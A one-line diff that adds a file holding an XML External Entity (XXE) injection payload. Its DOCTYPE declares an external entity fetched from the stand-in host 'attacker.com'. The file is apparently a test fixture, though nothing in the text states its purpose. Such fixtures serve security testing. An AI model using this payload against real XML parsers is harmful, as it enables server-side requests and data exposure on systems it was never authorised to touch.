@@ -1,0 +1,1 @@
+<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "http://attacker.com/xxe">]><data>&file;</data>
